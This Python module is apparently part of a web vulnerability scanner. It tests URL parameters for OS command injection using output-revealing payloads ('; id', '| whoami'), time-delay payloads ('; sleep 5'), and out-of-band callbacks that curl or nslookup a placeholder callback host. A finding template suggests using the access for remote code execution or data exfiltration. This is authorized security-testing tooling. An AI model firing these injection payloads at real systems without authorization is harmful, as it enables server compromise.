"""
CommandInjectionScanner — multi-signal command injection detection with OOB.

Lifecycle:
  DETECTED:   1 signal (output or time)
  VALIDATED:  2+ signals
  EXPLOITABLE: (not applicable — OOB promotes to VERIFIED)
  VERIFIED:   OOB callback received

Maturity: Level 4 (OOB-confirmed)
"""

import time
from typing import Any, Optional
from urllib.parse import urlparse, parse_qs

from modules.utils import (
    safe_get, finding, log, Colors, _build_curl,
    VerificationStage,
)
from scanners.base import ScannerBase
from models.evidence import TimingEvidence, HttpRequestEvidence, ResponseExcerptEvidence

CMD_INJECTION_PAYLOADS = {
    "unix": [
        ("; id", "uid="),
        ("| id", "uid="),
        ("`id`", "uid="),
        ("$(id)", "uid="),
        ("; uname -a", "Linux"),
        ("| uname -a", "Linux"),
        ("; whoami", ""),
        ("| whoami", ""),
    ],
    "windows": [
        ("| ver", "Microsoft"),
        ("& ver", "Microsoft"),
        ("; systeminfo", "OS"),
        ("| systeminfo", "OS"),
    ],
    "time_based": [
        ("; sleep 5", 5),
        ("| sleep 5", 5),
        ("& sleep 5", 5),
        ("`sleep 5`", 5),
        ("$(sleep 5)", 5),
    ],
    "oob": [
        "| nslookup {oob}",
        "; nslookup {oob}",
        "`nslookup {oob}`",
        "| curl http://{oob}/cmd",
        "; curl http://{oob}/cmd",
    ],
}

CMD_INJECTION_OUTPUT_SIGNATURES = [
    "uid=", "gid=", "groups=", "load average",
]
CMD_INJECTION_OUTPUT_SIGNATURES_WIN = [
    "boot loader", "for 16-bit app support",
]


class CommandInjectionScanner(ScannerBase):
    SCANNER_NAME = "cmd_injection"
    SCANNER_MATURITY = 4
    TARGET_LEVEL = False

    def __init__(self, config: dict, recon: dict, container=None):
        super().__init__(config, recon, container=container)
        self._oob_registrations: list[tuple[str, str, str]] = []

    @staticmethod
    def _inject_param(url: str, param: str, value: str) -> str:
        from urllib.parse import urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _test_parameter(self, url: str, param: str) -> tuple[dict, Optional[str], Optional[TimingEvidence]]:
        signals: dict[str, bool] = {"output": False, "time": False, "oob": False}
        evidence_parts: list[str] = []
        triggering_response: Optional[str] = None
        timing_ev: Optional[TimingEvidence] = None
        cmdi_payloads = self._load_payloads("cmdi")

        for payload, expected in cmdi_payloads.get("unix", CMD_INJECTION_PAYLOADS.get("unix", [])):
            test_url = self._inject_param(url, param, payload)
            resp = safe_get(self.session, test_url, self.timeout)
            if not resp:
                continue
            body = resp.text
            if expected and expected in body:
                signals["output"] = True
                evidence_parts.append(f"output:{expected}")
                triggering_response = resp.text[:500]
                break
            for sig in CMD_INJECTION_OUTPUT_SIGNATURES:
                if sig in body:
                    signals["output"] = True
                    evidence_parts.append(f"output:{sig}")
                    triggering_response = resp.text[:500]
                    break
            if signals["output"]:
                break

        if not signals["output"]:
            for payload, expected in cmdi_payloads.get("windows", CMD_INJECTION_PAYLOADS.get("windows", [])):
                test_url = self._inject_param(url, param, payload)
                resp = safe_get(self.session, test_url, self.timeout)
                if not resp:
                    continue
                body = resp.text
                if expected and expected in body:
                    signals["output"] = True
                    evidence_parts.append(f"output:{expected}")
                    triggering_response = resp.text[:500]
                    break
                for sig in CMD_INJECTION_OUTPUT_SIGNATURES_WIN:
                    if sig in body:
                        signals["output"] = True
                        evidence_parts.append(f"output:{sig}")
                        triggering_response = resp.text[:500]
                        break

        if not signals["output"]:
            baseline_start = time.time()
            safe_get(self.session, url, timeout=15, raise_for_status=False)
            baseline_delay = time.time() - baseline_start
            baseline_ms = baseline_delay * 1000
            for payload, min_delay in cmdi_payloads.get("time_based", CMD_INJECTION_PAYLOADS.get("time_based", [])):
                test_url = self._inject_param(url, param, payload)
                delays = []
                time_resp = None
                for _ in range(2):
                    start = time.time()
                    time_resp = safe_get(self.session, test_url, timeout=15, raise_for_status=False)
                    delays.append(time.time() - start)
                min_delay_actual = min(delays)
                if min_delay_actual > baseline_delay + 4 and all(d > baseline_delay + 3 for d in delays):
                    signals["time"] = True
                    triggered_ms = min_delay_actual * 1000
                    timing_ev = TimingEvidence(
                        baseline_time_ms=baseline_ms,
                        triggered_time_ms=triggered_ms,
                        total_attempts=len(delays),
                        description=f"Time-based CMDi on param '{param}': {triggered_ms:.0f}ms vs baseline {baseline_ms:.0f}ms",
                    )
                    evidence_parts.append(f"time:delay={min_delay_actual:.1f}s")
                    if time_resp:
                        triggering_response = time_resp.text[:500]
                    break

        oob_host = self.validation.callback_host if self.validation else ""
        if oob_host:
            for payload_template in cmdi_payloads.get("oob", CMD_INJECTION_PAYLOADS.get("oob", [])):
                oob_payload_str = self.validation.generate_oob_payload() if hasattr(self.validation, "generate_oob_payload") else f"x.{oob_host}"
                payload = payload_template.replace("{oob}", f"{oob_payload_str}.{oob_host}")
                test_url = self._inject_param(url, param, payload)
                safe_get(self.session, test_url, self.timeout, raise_for_status=False)
                self.validation.register_oob("cmd_injection", payload, test_url)
                self._oob_registrations.append(("cmd_injection", payload, test_url))
                break

        return signals, triggering_response, timing_ev

    def _build_finding(self, url: str, param: str, signals: dict,
                       request_str: str = "", response_excerpt_str: str = "",
                       timing_ev: TimingEvidence | None = None) -> Optional[dict]:
        signal_count = sum(1 for v in signals.values() if v)
        evidence_parts = [k for k, v in signals.items() if v]

        if signal_count >= 2:
            title = "Command Injection"
            severity = "critical"
            stage = VerificationStage.VALIDATED.value
        elif signal_count >= 1:
            title = "Potential Command Injection"
            severity = "high"
            stage = VerificationStage.DETECTED.value
        else:
            return None

        f = finding(
            vuln_type=title,
            url=url,
            severity=severity,
            details=f"Parameter '{param}': {signal_count} signal(s) ({', '.join(evidence_parts)})",
            evidence=" | ".join(evidence_parts),
            request=request_str or _build_curl("GET", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
            response_excerpt=response_excerpt_str,
            verification_stage=stage,
            parameter=param,
            steps_to_reproduce=[f"Send request to {url} with payload in {param}", f"Observe output/timing signal"],
        )
        if f and timing_ev:
            self.evidence_engine.store(timing_ev)
            self.evidence_engine.link_to_finding(timing_ev, f.get("fingerprint", ""))
        return f

    def scan(self, target_urls: list[str] | None = None) -> list[dict]:
        urls = self.recon.get("urls", []) if target_urls is None else target_urls
        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                params = list(parse_qs(urlparse(url).query).keys())
                for param in params:
                    signals, trigger_resp, timing_ev = self._test_parameter(url, param)
                    if signals and any(signals.values()):
                        f = self._build_finding(url, param, signals,
                            request_str=_build_curl("GET", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                            response_excerpt_str=trigger_resp or "",
                            timing_ev=timing_ev)
                        if f:
                            self._add_finding(f)
            except Exception as e:
                log(f"  [CMD] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
        return self._get_findings()

    def finalize(self) -> list[dict]:
        extra: list[dict] = []
        if not self.validation:
            return extra
        confirmed = self.validation.poll_oob()
        for ev in confirmed:
            payload_str = ev.callback_host or ""
            url_str = ""
            for vt, pl, u in self._oob_registrations:
                if payload_str and payload_str in pl:
                    url_str = u
                    break
            f = finding(
                vuln_type="Command Injection",
                url=url_str,
                severity="critical",
                details="Command injection confirmed via OOB callback — injected command executed on server",
                evidence=f"Callback: {(ev.raw_data or '')[:200]}",
                request=_build_curl("GET", url_str, dict(self.session.headers), cookies=dict(self.session.cookies)),
                verification_stage=VerificationStage.VERIFIED.value,
                response_excerpt="(Command injection confirmed via out-of-band callback — server executed injected command)",
                steps_to_reproduce=[
                    f"Send command injection payload to {url_str}",
                    "Observe OOB callback — confirms command execution on server",
                    "Use access for remote code execution or data exfiltration",
                ],
            )
            if f:
                self.evidence_engine.store(ev)
                self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
                self._add_finding(f)
                extra.append(f)
            log(f"  [CMD OOB] {url_str}", Colors.RED, verbose_only=True, verbose=self.verbose)
        return extra
